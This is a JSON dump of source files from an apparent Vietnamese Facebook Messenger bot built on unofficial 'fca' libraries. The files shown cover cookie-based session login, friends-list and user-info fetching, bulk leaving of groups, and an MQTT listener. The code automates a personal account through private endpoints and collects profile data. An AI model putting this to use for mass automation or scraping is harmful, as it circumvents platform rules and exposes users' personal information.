ƒêƒÉng nh·∫≠p v·ªõi 2FA th·∫•t b·∫°i.\");\n          return { status: false, message: 'Failed to log in with 2FA.' };\n        }\n      }\n    }\n\n    static formatCookiesToAppState(cookieString) {\n      return cookieString.split(';').reduce((acc, cookie) => {\n        const [key, value] = cookie.trim().split('=');\n        return value ? [...acc, { key, value, domain: 'facebook.com', path: '/' }] : acc;\n      }, []);\n    }\n  }\n\n  return FacebookLogin;\n}\n","path":null,"size_bytes":4998,"size_tokens":null},"lib/fca-auto/src/resolvePhotoUrl.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function resolvePhotoUrl(photoID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    defaultFuncs\n      .get(\"https://www.facebook.com/mercury/attachments/photo\", ctx.jar, { photo_id: photoID })\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(resData => {\n        if (resData.error) throw resData;\n        var photoUrl = resData.jsmods.require[0][3][0];\n        return callback(null, photoUrl);\n      })\n      .catch(err => {\n        log.error(\"resolvePhotoUrl\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1022,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserInfo.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatData(data) {\n  var retObj = {};\n\n  for (var prop in data) {\n    // eslint-disable-next-line no-prototype-builtins\n    if (data.hasOwnProperty(prop)) {\n      var innerObj = data[prop];\n      retObj[prop] = {\n        name: innerObj.name,\n        firstName: innerObj.firstName,\n        vanity: innerObj.vanity,\n        thumbSrc: innerObj.thumbSrc,\n        profileUrl: innerObj.uri,\n        gender: innerObj.gender,\n        type: innerObj.type,\n        isFriend: innerObj.is_friend,\n        isBirthday: !!innerObj.is_birthday\n      };\n    }\n  }\n\n  return retObj;\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  const Database = require('../Extra/Database');\n  return function getUserInfo(id, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, userInfo) {\n        if (err) return rejectFunc(err);\n        resolveFunc(userInfo);\n      };\n    }\n\n    if (utils.getType(id) !== \"Array\") id = [id];\n    if (utils.getType(global.Fca.Data.Userinfo) == \"Array\" || global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = new Map();\n    if (global.Fca.Data.AlreadyGetInfo != true) {\n      if (Database(true).has('UserInfo') == false) { \n        Database(true).set('UserInfo', []); \n        global.Fca.Data.AlreadyGetInfo = true; \n      }\n    }\n    var AlreadyGet = [];\n    var NeedGet = [];\n    if (global.Fca.Data.Userinfo != undefined && global.Fca.Data.Userinfo.size != undefined) {\n      for (let idu of id) {\n        if (global.Fca.Data.Userinfo.has(idu)) {\n          let Format = {};\n          Format[idu] = global.Fca.Data.Userinfo.get(idu);\n          AlreadyGet.push(Format);\n        } else {\n          const DatabaseUser = Database(true).get('UserInfo') || [];\n          const databaseUser = DatabaseUser.find(user => user.id === idu);\n          let Format = {};\n          Format[idu] = databaseUser;\n          if (databaseUser) {\n            AlreadyGet.push(Format);\n          } else {\n            NeedGet.push(idu);\n          }\n        }\n      }\n      \n    }\n\n    if (NeedGet.length > 0) {\n      let form = {};\n        NeedGet.map(function (v, i) {\n          form[\"ids[\" + i + \"]\"] = v;\n        });\n      defaultFuncs\n        .post(\"https://www.facebook.com/chat/user_info/\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then(function (resData) {\n              if (resData.error) throw resData;\n                if (AlreadyGet.length > 0) {\n                  AlreadyGet.push(formatData(resData.payload.profiles));\n                }\n                else if (AlreadyGet.length <= 0 && NeedGet.length == 1) {\n                  AlreadyGet = formatData(resData.payload.profiles);\n                }\n                else {\n                  AlreadyGet.push(formatData(resData.payload.profiles));\n                }\n                callback(null, AlreadyGet);\n              })\n            .catch(function (err) {\n          log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n        callback(err, null);\n      });\n    }\n    else if (AlreadyGet.length == 1) {\n      callback(null,AlreadyGet[0]);\n    }\n    else if (AlreadyGet.length > 1) {\n      callback(null, AlreadyGet);\n    }\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":3531,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getFriendsList.js":{"content":"\"use strict\";\n\n//var cheerio = require(\"cheerio\");\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n// [almost] copy pasted from one of FB's minified file (GenderConst)\nvar GENDERS = {\n  0: \"unknown\",\n  1: \"female_singular\",\n  2: \"male_singular\",\n  3: \"female_singular_guess\",\n  4: \"male_singular_guess\",\n  5: \"mixed\",\n  6: \"neuter_singular\",\n  7: \"unknown_singular\",\n  8: \"female_plural\",\n  9: \"male_plural\",\n  10: \"neuter_plural\",\n  11: \"unknown_plural\"\n};\n\nfunction formatData(obj) {\n  return Object.keys(obj).map(function (key) {\n    var user = obj[key];\n    return {\n      alternateName: user.alternateName,\n      firstName: user.firstName,\n      gender: GENDERS[user.gender],\n      userID: utils.formatID(user.id.toString()),\n      isFriend: user.is_friend != null && user.is_friend ? true : false,\n      fullName: user.name,\n      profilePicture: user.thumbSrc,\n      type: user.type,\n      profileUrl: user.uri,\n      vanity: user.vanity,\n      isBirthday: !!user.is_birthday\n    };\n  });\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getFriendsList(callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n        resolveFunc(friendList);\n      };\n    }\n\n    defaultFuncs\n      .postFormData(\"https://www.facebook.com/chat/user_info_all\", ctx.jar, {}, { viewer: ctx.userID })\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"getFriendsList returned empty object.\" };\n        if (resData.error) throw resData;\n        callback(null, formatData(resData.payload));\n      })\n      .catch(function (err) {\n        log.error(\"getFriendsList\", \"L·ªói getFriendsList C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu ! H√£y H·∫°n Ch·∫ø !\");\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2095,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/unsendMqttMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn function(threadID, messageID ,callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n        if (!callback && utils.getType(messageID) === \"AsyncFunction\" || !callback && utils.getType(messageID) === \"Function\") messageID = callback;\n\t\t\n        if (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\n        const Payload = {\n            message_id:messageID,\n            thread_key:threadID,\n            sync_group: 1\n        };\n\n        if (messageID != undefined || messageID != null) Payload.reply_metadata = {\n            reply_source_id: messageID,\n            reply_source_type: 1,\n            reply_type: 0\n        };\n\n        const Form = JSON.stringify({\n            app_id: \"2220391788200892\",\n            payload: JSON.stringify({\n                tasks: [{\n                    label: 33,\n                    payload: JSON.stringify(Payload),\n                    queue_name: \"unsend_message\",\n                    task_id: Math.random() * 1001 << 0,\n                    failure_count: null,\n                }],\n                epoch_id: utils.generateOfflineThreadingID(),\n                version_id: '9094446350588544',\n\n            }),\n            request_id: ++ctx.req_ID,\n            type: 3\n        });\n\n\t\tctx.mqttClient.publish('/ls_req', Form,{\n            qos: 1,\n            retain: false,\n        });\n        ctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"unsendMqttMessage\",\n        });\n        \n\t\treturn returnPromise;\n\t};\n};","path":null,"size_bytes":1854,"size_tokens":null},"modules/commands/outall.js":{"content":"module.exports.config = { \t\n\tname: \"outall\", \t\n\tversion: \"1.0.0\", \t\n  hasPermssion: 3, \t\n\tcredits: \"VInhdz\", \t\n\tdescription: \"out all box\", \t\n\tcommandCategory: \"H·ªá Th·ªëng\", \t\n\tusages: \"sendnoti [Text]\", \t\n\tcooldowns: 5, \t\n};\n\tmodule.exports.run = async ({ api, event, args }) => { \t\n\treturn api.getThreadList(100, null, [\"INBOX\"], (err, list) => { \t\tif (err) throw err; \t\t\n\tlist.forEach(item => (item.isGroup == true && item.threadID != event.threadID) ? \n\tapi.removeUserFromGroup(api.getCurrentUserID(), item.threadID) : ''); \t\t\n\tapi.sendMessage(' ƒêaÃÉ out all box thaÃÄnh coÃÇng', event.threadID); \t\n}); \n}","path":null,"size_bytes":612,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/markAsReadAll.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function markAsReadAll(callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      folder: 'inbox'\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/mark_folder_as_read.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"markAsReadAll\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":1038,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/listenMqtt.js":{"content":"/* eslint-disable linebreak-style */\n'use strict';\n\nconst utils = require('../utils');\nconst log = require('npmlog');\nconst mqtt = require('mqtt');\nconst WebSocket = require('ws');\nconst HttpsProxyAgent = require('https-proxy-agent');\nconst EventEmitter = require('events');\nconst Duplexify = require('duplexify');\nconst {\n  Transform\n} = require('stream');\nvar identity = function() {};\nvar form = {};\nvar getSeqID = function() {};\nglobal.Fca.Data.MsgCount = new Map();\nglobal.Fca.Data.event = new Map();\n\nconst topics = ['/ls_req', '/ls_resp', '/legacy_web', '/webrtc', '/rtc_multi', '/onevc', '/br_sr', '/sr_res', '/t_ms', '/thread_typing', '/orca_typing_notifications', '/notify_disconnect', '/orca_presence', '/inbox', '/mercury', '/messaging_events', '/orca_message_notifications', '/pp', '/webrtc_response'];\n\nlet WebSocket_Global;\n\nfunction buildProxy() {\n  const Proxy = new Transform({\n    objectMode: false,\n    transform(chunk, enc, next) {\n      if (WebSocket_Global.readyState !== WebSocket_Global.OPEN) {\n        return next();\n      }\n\n      let data;\n      if (typeof chunk === 'string') {\n        data = Buffer.from(chunk, 'utf8');\n      } else {\n        data = chunk;\n      }\n\n      WebSocket_Global.send(data);\n      next();\n    },\n    flush(done) {\n      WebSocket_Global.close();\n      done();\n    },\n    writev(chunks, cb) {\n      const buffers = chunks.map(({ chunk }) => {\n        if (typeof chunk === 'string') {\n          return Buffer.from(chunk, 'utf8');\n        }\n        return chunk;\n      });\n      this._write(Buffer.concat(buffers), 'binary', cb);\n    },\n  });\n  return Proxy;\n}\n\nfunction buildStream(options, WebSocket, Proxy) {\n  const Stream = Duplexify(undefined, undefined, options);\n  Stream.socket = WebSocket;\n\n  WebSocket.onclose = () => {\n    Stream.end();\n    Stream.destroy();\n  };\n\n  WebSocket.onerror = (err) => {\n    Stream.destroy(err);\n  };\n\n  WebSocket.onmessage = (event) => {\n    const data = event.data instanceof ArrayBuffer ? Buffer.from(event.data) : Buffer.from(event.data, 'utf8');\n    Stream.push(data);\n  };\n\n  WebSocket.onopen = () => {\n    Stream.setReadable(Proxy);\n    Stream.setWritable(Proxy);\n    Stream.emit('connect');\n  };\n\n  WebSocket_Global = WebSocket;\n  Proxy.on('close', () => WebSocket.close());\n\n  return Stream;\n}\n\nfunction listenMqtt(defaultFuncs, api, ctx, globalCallback) {\n  const chatOn = ctx.globalOptions.online;\n  const foreground = false;\n\n  const sessionID = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER) + 1;\n  const GUID = utils.getGUID()\n  const username = {\n    u: ctx.userID,\n    s: sessionID,\n    chat_on: chatOn,\n    fg: foreground,\n    d: GUID,\n    ct: 'websocket',\n    aid: '219994525426954',\n    aids: null,\n    mqtt_sid: '',\n    cp: 3,\n    ecp: 10,\n    st: [],\n    pm: [],\n    dc: '',\n    no_auto_fg: true,\n    gas: null,\n    pack: [],\n    p: null,\n    php_override: \"\"\n  };\n\n  const cookies = ctx.jar.getCookies('https://www.facebook.com').join('; ');\n\n  let host;\n  if (ctx.mqttEndpoint) {\n    host = `${ctx.mqttEndpoint}&sid=${sessionID}&cid=${GUID}`;\n  } else if (ctx.region) {\n    host = `wss://edge-chat.facebook.com/chat?region=${ctx.region.toLowerCase()}&sid=${sessionID}&cid=${GUID}`;\n  } else {\n    host = `wss://edge-chat.facebook.com/chat?sid=${sessionID}&cid=${GUID}`;\n  }\n\n  const options = {\n    clientId: 'mqttwsclient',\n    protocolId: 'MQIsdp',\n    protocolVersion: 3,\n    username: JSON.stringify(username),\n    clean: true,\n    wsOptions: {\n      headers: {\n        Cookie: cookies,\n        Origin: 'https://www.facebook.com',\n        'User-Agent': ctx.globalOptions.userAgent,\n        Referer: 'https://www.facebook.com/',\n        Host: new URL(host).hostname,\n      },\n      origin: 'https://www.facebook.com',\n      protocolVersion: 13,\n      binaryType: 'arraybuffer',\n    },\n    keepalive: 60,\n    reschedulePings: true,\n    reconnectPeriod: 3,\n  };\n\n  if (ctx.globalOptions.proxy !== undefined) {\n    const agent = new HttpsProxyAgent(ctx.globalOptions.proxy);\n    options.wsOptions.agent = agent;\n  }\n\n  ctx.mqttClient = new mqtt.Client(() => buildStream(options, new WebSocket(host, options.wsOptions), buildProxy()), options);\n  global.mqttClient = ctx.mqttClient;\n\n  global.mqttClient.on('error', (err) => {\n    log.error('listenMqtt', err);\n    global.mqttClient.end();\n\n    if (ctx.globalOptions.autoReconnect) {\n      getSeqID();\n    } else {\n      globalCallback({\n        type: 'stop_listen',\n        error: 'Server ƒê√£ S·∫≠p - Auto Restart'\n      }, null);\n      return process.exit(1);\n    }\n  });\n\n  global.mqttClient.on('connect', () => {\n    if (!global.Fca.Data.Setup || global.Fca.Data.Setup === undefined) {\n      if (global.Fca.Require.FastConfig.RestartMQTT_Minutes !== 0 && global.Fca.Data.StopListening !== true) {\n        global.Fca.Data.Setup = true;\n        setTimeout(() => {\n          global.Fca.Require.logger.Warning('Closing MQTT Client...');\n          ctx.mqttClient.end();\n          global.Fca.Require.logger.Warning('Reconnecting MQTT Client...');\n          global.Fca.Data.Setup = false;\n          getSeqID();\n        }, Number(global.Fca.Require.FastConfig.RestartMQTT_Minutes) * 60 * 1000);\n      }\n    }\n\n    if (process.env.OnStatus === undefined) {\n      global.Fca.Require.logger.Normal('B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access');\n\n      if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) === 0) {\n        // something\n      } else if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) < 10) {\n        log.warn('AutoRestartMinutes', 'The number of minutes to automatically restart must be more than 10 minutes');\n      } else if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) < 0) {\n        log.warn('AutoRestartMinutes', 'Invalid auto-restart minutes!');\n      } else {\n        global.Fca.Require.logger.Normal(global.Fca.getText(global.Fca.Require.Language.Src.AutoRestart, global.Fca.Require.FastConfig.AutoRestartMinutes));\n        global.Fca.Require.logger.Normal(`Auto Restart MQTT Client After: ${global.Fca.Require.FastConfig.RestartMQTT_Minutes} Minutes`);\n        setTimeout(() => {\n          global.Fca.Require.logger.Normal(global.Fca.Require.Language.Src.OnRestart);\n          process.exit(1);\n        }, Number(global.Fca.Require.FastConfig.AutoRestartMinutes) * 60000);\n      }\n      require('../broadcast').startBroadcasting();\n      const MemoryManager = require('../Extra/Src/Release_Memory');\n      const path = require('path');\n\n      const SettingMemoryManager = {\n        warningThreshold: 0.7,\n        releaseThreshold: 0.8,\n        maxThreshold: 0.9,\n        interval: 300 * 1000,\n        logLevel: 'warn',\n        logFile: path.join(process.cwd(), 'Horizon_Database' ,'memory.log'),\n        smartReleaseEnabled: true,\n        allowLog: (global.Fca.Require.FastConfig.AntiStuckAndMemoryLeak.LogFile.Use || false)\n      };\n\n      const memoryManager = new MemoryManager(SettingMemoryManager);\n\n      memoryManager.autoStart(60 * 60 * 1000);\n\n      if (global.Fca.Require.FastConfig.AntiStuckAndMemoryLeak.AutoRestart.Use) {\n        memoryManager.onMaxMemory(function() {\n          global.Fca.Require.logger.Warning('Memory Usage >= 90% - Auto Restart Avoid Crash');\n          process.exit(1);\n        });\n      }\n      process.env.OnStatus = true;\n    }\n\n    topics.forEach((topicsub) => global.mqttClient.subscribe(topicsub));\n\n\n    let topic;\n    const queue = {\n      sync_api_version: 11,\n      max_deltas_able_to_process: 100,\n      delta_batch_size: 500,\n      encoding: 'JSON',\n      entity_fbid: ctx.userID,\n    };\n\n    topic = \"/messenger_sync_create_queue\";\n    queue.initial_titan_sequence_id = ctx.lastSeqId;\n    queue.device_params = null;\n\n    global.mqttClient.publish(topic, JSON.stringify(queue), {\n      qos: 1,\n      retain: false\n    });\n\n    var rTimeout = setTimeout(function() {\n      global.mqttClient.end();\n      getSeqID();\n    }, 3000);\n\n    ctx.tmsWait = function() {\n      clearTimeout(rTimeout);\n      ctx.globalOptions.emitReady ? globalCallback({\n        type: \"ready\",\n        error: null\n      }) : '';\n      delete ctx.tmsWait;\n    };\n  });\n\n  const HandleMessage = function(topic, message, _packet) {\n    const jsonMessage = JSON.parse(message.toString());\n    if (topic === \"/t_ms\") {\n      if (ctx.tmsWait && typeof ctx.tmsWait == \"function\") ctx.tmsWait();\n\n      if (jsonMessage.firstDeltaSeqId && jsonMessage.syncToken) {\n        ctx.lastSeqId = jsonMessage.firstDeltaSeqId;\n        ctx.syncToken = jsonMessage.syncToken;\n      }\n\n      if (jsonMessage.lastIssuedSeqId) ctx.lastSeqId = parseInt(jsonMessage.lastIssuedSeqId);\n      //If it contains more than 1 delta\n      for (var i in jsonMessage.deltas) {\n        var delta = jsonMessage.deltas[i];\n        parseDelta(defaultFuncs, api, ctx, globalCallback, {\n          \"delta\": delta\n        });\n      }\n    } else if (topic === \"/ls_resp\") {\n      const payload = JSON.parse(jsonMessage.payload); //'{\"name\":null,\"step\":[1,[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"replaceOptimsiticMessage\",\"7192532113093667880\",\"mid.$gABfX5li9LA6VdUymnWPRAdlkiawo\"]]]],[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"mailboxTaskCompletionApiOnTaskCompletion\",[19,\"415\"],true]]]],[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"removeTask\",[19,\"415\"],[9]]]]]]}'\n      const request_ID = jsonMessage.request_id;\n\n      if (ctx.callback_Task[request_ID] != undefined && ctx.callback_Task[request_ID].type != undefined) {\n        const {\n          callback,\n          type\n        } = ctx.callback_Task[request_ID];\n        const Data = new getRespData(type, payload);\n        if (!callback) {\n          return;\n        }\n        else if (!Data) {\n          callback(\"Something went wrong üê≥\", null);\n        } else {\n          callback(null, Data);\n        }\n      }\n    } else if (topic === \"/thread_typing\" || topic === \"/orca_typing_notifications\") {\n      var typ = {\n        type: \"typ\",\n        isTyping: !!jsonMessage.state,\n        from: jsonMessage.sender_fbid.toString(),\n        threadID: utils.formatID((jsonMessage.thread || jsonMessage.sender_fbid).toString())\n      };\n      (function() {\n        globalCallback(null, typ);\n      })();\n    } else if (topic === \"/orca_presence\") {\n      if (!ctx.globalOptions.updatePresence) {\n        for (var i in jsonMessage.list) {\n          var data = jsonMessage.list[i];\n          var userID = data[\"u\"];\n\n          var presence = {\n            type: \"presence\",\n            userID: userID.toString(),\n            //Convert to ms\n            timestamp: data[\"l\"] * 1000,\n            statuses: data[\"p\"]\n          };\n          (function() {\n            globalCallback(null, presence);\n          })();\n        }\n      }\n    }\n\n  };\n\n  global.mqttClient.on('message', HandleMessage);\n\n  process.on('SIGINT', () => {\n    LogUptime();\n    process.kill(process.pid);\n  });\n\n  process.on('exit', LogUptime);\n\n\n}\n\nfunction getRespData(Type, payload) {\n  try {\n    switch (Type) {\n      case \"sendMqttMessage\": {\n        return {\n          type: Type,\n          threadID: payload.step[1][2][2][1][2], //this is sick bro\n          messageID: payload.step[1][2][2][1][3],\n          payload: payload.step[1][2]\n        };\n      }\n      default: { //!very LAZY :> cook yourself\n        return {\n          Data: payload.step[1][2][2][1],\n          type: Type,\n          payload: payload.step[1][2]\n        };\n      }\n    }\n  } catch (e) {\n    return null;\n  }\n}\n\nfunction LogUptime() {\n  const uptime = process.uptime();\n  const {\n    join\n  } = require('path');\n  const filePath = join(__dirname, '../CountTime.json');\n\n  let time1;\n  if (global.Fca.Require.fs.existsSync(filePath)) {\n    time1 = Number(global.Fca.Require.fs.readFileSync(filePath, 'utf8')) || 0;\n  } else {\n    time1 = 0;\n  }\n\n  global.Fca.Require.fs.writeFileSync(filePath, String(Number(uptime) + time1), 'utf8');\n}\n\nif (global.Fca.Require.FastConfig.AntiGetInfo.AntiGetThreadInfo) {\n    setInterval(() => {\n        try {\n            const { updateMessageCount, getData, hasData } = require('../Extra/ExtraGetThread');\n            const Data = global.Fca.Data.MsgCount;\n            const Arr = Array.from(Data.keys());\n            for (let i of Arr) {\n                const Count = parseInt(Data.get(i));\n                if (hasData(i)) {\n                    let x = getData(i);\n                    x.messageCount += Count;\n                    updateMessageCount(i, x);\n                    Data.delete(i);\n                }\n            }\n            \n        } catch (e) {\n            console.log(e);\n        }\n    }, 30 * 1000);\n}\n\nfunction parseDelta(defaultFuncs, api, ctx, globalCallback, {\n  delta\n}) {\n  if (delta.class === 'NewMessage') {\n    if (ctx.globalOptions.pageID && ctx.globalOptions.pageID !== delta.queue) return;\n\n    const resolveAttachmentUrl = (i) => {\n      if (!delta.attachments || i === delta.attachments.length || utils.getType(delta.attachments) !== 'Array') {\n        let fmtMsg;\n        try {\n          fmtMsg = utils.formatDeltaMessage(delta);\n        } catch (err) {\n          return log.error('L·ªói Nh·∫π', err);\n        }\n        \n        if (fmtMsg) {\n            const isGroup = fmtMsg.isGroup;\n            const threadID = fmtMsg.threadID;\n            const messageID = fmtMsg.messageID;\n            \n            global.Fca.Data.event.set(\"Data\", {\n                isGroup,\n                threadID,\n                messageID\n            });\n\n            if (global.Fca.Require.FastConfig.AntiGetInfo.AntiGetThreadInfo) {\n                global.Fca.Data.MsgCount.set(fmtMsg.threadID, ((global.Fca.Data.MsgCount.get(fmtMsg.threadID)) + 1 || 1));\n            }    \n\n          if (ctx.globalOptions.autoMarkDelivery) {\n            markDelivery(ctx, api, fmtMsg.threadID, fmtMsg.messageID);\n          }\n\n          if (!ctx.globalOptions.selfListen && fmtMsg.senderID === ctx.userID) return;\n          globalCallback(null, fmtMsg);\n        }\n      } else {\n        const attachment = delta.attachments[i];\n        if (attachment.mercury.attach_type === 'photo') {\n          api.resolvePhotoUrl(attachment.fbid, (err, url) => {\n            if (!err) attachment.mercury.metadata.url = url;\n            resolveAttachmentUrl(i + 1);\n          });\n        } else {\n          resolveAttachmentUrl(i + 1);\n        }\n      }\n    };\n\n    resolveAttachmentUrl(0);\n  } else if (delta.class === 'ClientPayload') {\n    const clientPayload = utils.decodeClientPayload(delta.payload);\n    if (clientPayload && clientPayload.deltas) {\n      for (const delta of clientPayload.deltas) {\n        if (delta.deltaMessageReaction && !!ctx.globalOptions.listenEvents) {\n          const messageReaction = {\n            type: 'message_reaction',\n            threadID: (delta.deltaMessageReaction.threadKey.threadFbId ? delta.deltaMessageReaction.threadKey.threadFbId : delta.deltaMessageReaction.threadKey.otherUserFbId).toString(),\n            messageID: delta.deltaMessageReaction.messageId,\n            reaction: delta.deltaMessageReaction.reaction,\n            senderID: delta.deltaMessageReaction.senderId.toString(),\n            userID: delta.deltaMessageReaction.userId.toString(),\n          };\n          globalCallback(null, messageReaction);\n        } else if (delta.deltaRecallMessageData && !!ctx.globalOptions.listenEvents) {\n          const messageUnsend = {\n            type: 'message_unsend',\n            threadID: (delta.deltaRecallMessageData.threadKey.threadFbId ? delta.deltaRecallMessageData.threadKey.threadFbId : delta.deltaRecallMessageData.threadKey.otherUserFbId).toString(),\n            messageID: delta.deltaRecallMessageData.messageID,\n            senderID: delta.deltaRecallMessageData.senderID.toString(),\n            deletionTimestamp: delta.deltaRecallMessageData.deletionTimestamp,\n            timestamp: delta.deltaRecallMessageData.timestamp,\n          };\n          globalCallback(null, messageUnsend);\n        } else if (delta.deltaMessageReply) {\n          const mdata =\n            delta.deltaMessageReply.message === undefined ?\n            [] :\n            delta.deltaMessageReply.message.data === undefined ?\n            [] :\n            delta.deltaMessageReply.message.data.prng === undefined ?\n            [] :\n            JSON.parse(delta.deltaMessageReply.message.data.prng);\n\n          const m_id = mdata.map((u) => u.i);\n          const m_offset = mdata.map((u) => u.o);\n          const m_length = mdata.map((u) => u.l);\n\n          const mentions = {};\n          for (let i = 0; i < m_id.length; i++) {\n            mentions[m_id[i]] = (delta.deltaMessageReply.message.body || '').substring(m_offset[i], m_offset[i] + m_length[i]);\n          }\n\n          const callbackToReturn = {\n            type: 'message_reply',\n            threadID: (delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.message.messageMetadata.threadKey.otherUserFbId).toString(),\n            messageID: delta.deltaMessageReply.message.messageMetadata.messageId,\n            senderID: delta.deltaMessageReply.message.messageMetadata.actorFbId.toString(),\n            attachments: ( delta.deltaMessageReply.message.attachments || [] )\n              .map((att) => {\n                const mercury = JSON.parse(att.mercuryJSON);\n                Object.assign(att, mercury);\n                return att;\n              })\n              .map((att) => {\n                let x;\n                try {\n                  x = utils._formatAttachment(att);\n                } catch (ex) {\n                  x = att;\n                  x.error = ex;\n                  x.type = 'unknown';\n                }\n                return x;\n              }),\n            args: (delta.deltaMessageReply.message.body || '').trim().split(/\\s+/),\n            body: delta.deltaMessageReply.message.body || '',\n            isGroup: !!delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId,\n            mentions,\n            timestamp: parseInt(delta.deltaMessageReply.message.messageMetadata.timestamp),\n            participantIDs: (delta.deltaMessageReply.message.participants || []).map((e) => e.toString()),\n          };\n\n          if (delta.deltaMessageReply.repliedToMessage) {\n            const mdata =\n              delta.deltaMessageReply.repliedToMessage === undefined ?\n              [] :\n              delta.deltaMessageReply.repliedToMessage.data === undefined ?\n              [] :\n              delta.deltaMessageReply.repliedToMessage.data.prng === undefined ?\n              [] :\n              JSON.parse(delta.deltaMessageReply.repliedToMessage.data.prng);\n\n            const m_id = mdata.map((u) => u.i);\n            const m_offset = mdata.map((u) => u.o);\n            const m_length = mdata.map((u) => u.l);\n\n            const rmentions = {};\n            for (let i = 0; i < m_id.length; i++) {\n              rmentions[m_id[i]] = (delta.deltaMessageReply.repliedToMessage.body || '').substring(m_offset[i], m_offset[i] + m_length[i]);\n            }\n\n            callbackToReturn.messageReply = {\n              threadID: (delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.otherUserFbId).toString(),\n              messageID: delta.deltaMessageReply.repliedToMessage.messageMetadata.messageId,\n              senderID: delta.deltaMessageReply.repliedToMessage.messageMetadata.actorFbId.toString(),\n              attachments: delta.deltaMessageReply.repliedToMessage.attachments\n              .map((att) => {\n                let mercury;\n                try {\n                  mercury = JSON.parse(att.mercuryJSON);\n                  Object.assign(att, mercury);\n                } catch (ex) {\n                  mercury = {};\n                }\n                return att;\n              })\n              .map((att) => {\n                let x;\n                try {\n                  x = utils._formatAttachment(att);\n                } catch (ex) {\n                  x = att;\n                  x.error = ex;\n                  x.type = 'unknown';\n                }\n                return x;\n              }),\n              args: (delta.deltaMessageReply.repliedToMessage.body || '').trim().split(/\\s+/),\n              body: delta.deltaMessageReply.repliedToMessage.body || '',\n              isGroup: !!delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId,\n              mentions: rmentions,\n              timestamp: parseInt(delta.deltaMessageReply.repliedToMessage.messageMetadata.timestamp),\n              participantIDs: (delta.deltaMessageReply.repliedToMessage.participants || []).map((e) => e.toString()),\n            };\n          } else if 